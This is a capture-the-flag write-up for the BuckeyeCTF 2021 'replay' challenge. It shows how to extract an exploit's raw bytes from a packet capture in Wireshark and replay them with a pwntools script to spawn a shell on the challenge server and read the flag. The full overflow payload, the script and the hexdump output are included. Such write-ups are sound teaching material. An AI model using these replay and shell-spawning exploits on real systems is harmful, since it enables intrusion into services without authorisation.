---
layout: post
title:  "replay"
date:   2021-10-24 22:31:21 -0400
category: [writeups]
challenge-source: [BuckeyeCTF2021]
challenge-category: ['misc']
tags: [BuckeyeCTF2021, Wireshark, pwntools]
author: shinris3n
---

<h1></h1>
<h3><font color=FF3030> Challenge Text: </font></h3>

```console
Author: qxxxb

Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit.
Oh by the way, the same app is also running on misc.chall.pwnoh.io on port 13371. 
Can you pwn it for me?
``` 
<h3><font color=FF3030> Solution: </font></h3>

- Let's first connect to the app ourselves to see what the interaction looks like:

```console
┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
└─$ nc misc.chall.pwnoh.io 13371
HELLO HOW ARE YOU DOING TODAY
Fantastic!
```
- Analyzing the pcap that we are provided using Wireshark, we can follow the TCP stream to see what was being sent and received.  This can be done by clicking the entry and navigating the menu options to Follow -> TCP Stream:

![fda98c019234993fa2d0372ba431002a.png](/assets/writeups/BuckeyeCTF2021/fda98c019234993fa2d0372ba431002a.png)

![704d1f854245ddf00df5ba2ccecd17e6.png](/assets/writeups/BuckeyeCTF2021/704d1f854245ddf00df5ba2ccecd17e6.png)

- Comparing this to what we saw when we first connected to the app, it looks like some shellcode was sent across to exploit the app successfully.  We can see the hex bytes for this shellcode by setting the "Show data as" field to "Raw":

![aa6d3e14537b51c7ca8e5fe361b13256.png](/assets/writeups/BuckeyeCTF2021/aa6d3e14537b51c7ca8e5fe361b13256.png)

- Now we're able to write our own exploit script, using this as a payload.   Below is a Python3 implementation of such a script, leveraging the pwntools CTF toolkit to make catching and handling the command shell our payload spawns easier.

```python
# BuckEyeCTF 2021 - Replay
# shinris3n/NINPWN

from pwn import * # pip3 install pwn

# Open up connection.
address = 'misc.chall.pwnoh.io'
port = 13371
tcpsocket = remote(address, port)

# Receive server input request
print(tcpsocket.recvuntil('\n'.encode('utf-8')))

# Define payload from wireshark capture
payload = "\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x55\x11\x40\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x20\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a"

# Encode and send payload
tcpsocket.sendline(payload.encode('utf-8'))
print ('Sent: 0x' + binascii.hexlify(payload.encode('utf-8')).decode('utf-8'))

# Catch the shell
tcpsocket.interactive()
```
```console
┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
└─$ python3 ./replay.py 
[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
b'HELLO HOW ARE YOU DOING TODAY\n'
Sent: 0x6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
[*] Switching to interactive mode
$ ls
chall
flag.txt
$ cat flag.txt
buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
```
- As an aside, pwntools has a neat debugging feature as well that can help if your shellcode isn't quite working the way you want it to and you need some more information about what you're actually sending across:

```console
┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
└─$ python3 ./replay.py DEBUG
[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
[DEBUG] Received 0x1e bytes:
    b'HELLO HOW ARE YOU DOING TODAY\n'
b'HELLO HOW ARE YOU DOING TODAY\n'
[DEBUG] Sent 0x19a bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  55 11 40 00  00 00 00 00  │haab│iaab│U·@·│····│
    00000090  0f 00 00 00  00 00 00 00  57 11 40 00  00 00 00 00  │····│····│W·@·│····│
    000000a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000100  00 00 00 00  00 00 00 00  04 20 40 00  00 00 00 00  │····│····│· @·│····│
    00000110  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000130  3b 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │;···│····│····│····│
    00000140  00 00 00 00  00 00 00 00  57 11 40 00  00 00 00 00  │····│····│W·@·│····│
    00000150  00 00 00 00  00 00 00 00  33 00 00 00  00 00 00 00  │····│····│3···│····│
    00000160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000190  00 00 00 00  00 00 00 00  0a 0a                     │····│····│··│
    0000019a
Sent: 0x6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
[*] Switching to interactive mode
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x33 bytes:
    b'buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}\n'
buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
$ 
[*] Interrupted
[*] Closed connection to misc.chall.pwnoh.io port 13371
```
